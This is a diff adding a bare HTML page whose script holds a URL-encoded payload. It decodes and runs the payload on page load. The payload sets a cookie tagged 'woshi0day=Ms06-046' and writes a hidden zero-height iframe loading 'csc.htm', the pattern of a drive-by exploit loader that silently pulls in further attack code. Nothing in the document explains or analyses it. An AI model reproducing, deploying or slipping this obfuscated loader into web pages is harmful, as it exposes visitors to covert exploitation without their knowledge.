@@ -1,0 +1,18 @@
+<HTML>
+<HEAD>
+<SCRIPT LANGUAGE="Javascript">
+<!--
+var Words ="%3CSCRIPT%20LANGUAGE%3D%22javascript%22%20TYPE%3D%22text%2Fjavascript%22%3E%0D%0A%0D%0Avar%20cookieString%20%3D%20document%2Ecookie%3B%0D%0A%0D%0Avar%20start%20%3D%20cookieString%2EindexOf%28%22woshi0day%3D%22%29%3B%0D%0A%0D%0Aif%20%28start%20%21%3D%20%2D1%29%0D%0A%0D%0A%7B%7D%0D%0A%0D%0Aelse%0D%0A%0D%0A%7B%0D%0A%0D%0Avar%20expires%20%3D%20new%20Date%28%29%3B%0D%0A%0D%0Aexpires%2EsetTime%28expires%2EgetTime%28%29%20%2B%202%20%2A%2060%20%2A%2060%20%2A%201000%29%3B%0D%0A%0D%0Adocument%2Ecookie%20%3D%20%22woshi0day%3DMs06%2D046%3Bexpires%3D%22%20%2B%20expires%2EtoGMTString%28%29%3B%0D%0Adocument%2Ewrite%28%22%3Ciframe%20width%3D100%20height%3D0%20src%3D%27csc%2Ehtm%27%3E%3C%2Fiframe%3E%22%29%3B%0D%0A%7D%3C%2FSCRIPT%3E%0D%0A"
+function SetNewWords()
+{
+var NewWords;
+NewWords = unescape(Words);
+document.write(NewWords);
+}
+SetNewWords();
+// -->
+</SCRIPT>
+</HEAD>
+<BODY>
+</BODY>
+</HTML>
